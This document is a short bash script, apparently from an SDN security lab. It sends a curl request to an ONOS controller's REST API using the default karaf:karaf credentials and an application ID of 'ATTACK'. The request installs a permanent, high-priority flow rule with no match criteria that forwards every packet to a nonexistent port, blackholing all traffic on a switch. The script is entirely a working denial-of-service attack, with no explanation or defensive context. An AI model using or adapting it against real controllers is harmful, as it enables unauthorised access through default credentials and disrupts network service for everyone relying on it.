#!/bin/bash

CONTROLLER_IP=10.0.3.11
PORT=8181
SWITCH1_DPID=0000000000000001
SWITCH2_DPID=0000000000000002
HOST1_MAC=00:00:00:00:00:11
HOST2_MAC=00:00:00:00:00:22

curl -X POST --header 'Content-Type: application/json' --header 'Accept: application/json' 'http://'$CONTROLLER_IP':'$PORT'/onos/v1/flows/of:'$SWITCH1_DPID'?appId=ATTACK' -u karaf:karaf -d '{"priority":1000, "isPermanent":true, "treatment":{"instructions":[{"type":"OUTPUT","port":999999}]}}'
